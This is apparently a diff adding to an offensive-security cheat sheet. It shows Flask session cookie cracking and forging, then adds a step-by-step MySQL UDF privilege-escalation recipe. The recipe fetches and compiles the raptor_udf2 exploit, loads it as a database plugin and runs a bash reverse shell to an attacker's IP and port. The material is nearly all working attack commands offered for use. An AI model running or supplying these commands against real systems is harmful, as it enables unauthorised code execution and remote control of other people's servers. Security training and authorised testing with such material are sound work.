@@ -527,3 +527,30 @@ flask-unsign --unsign --cookie "<cookie>" --wordlist ~/Documents/rockyou.txt --n
 # create session 
 flask-unsign --sign --cookie "{'logged_in': True, 'username': '<username>'}" --secret <keystring>
 ```
+
+MySQL UDF
+
+```shell
+# attacker pc 
+wget http://0xdeadbeef.info/exploits/raptor_udf2.c
+
+# target host
+cd /tmp
+wget http://<attacker ip>:<attacker port>/raptor_udf2.c
+gcc -g -c raptor_udf2.c
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+
+mysql -u root -p
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/tmp/raptor_udf2.so'));
+# show plugin folder path
+show variables like '%plugin%';
+# change plugin path
+# e.g., select * from foo into dumpfile "/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so";
+select * from foo into dumpfile "<plugin folder path>/raptor_udf2.so";
+create function do_system returns integer soname 'raptor_udf2.so';
+# check loading
+select * from mysql.func;
+select do_system('echo ''/bin/bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1'' > /tmp/revshell.sh && chmod 777 /tmp/revshell.sh && /bin/bash /tmp/revshell.sh');
+```
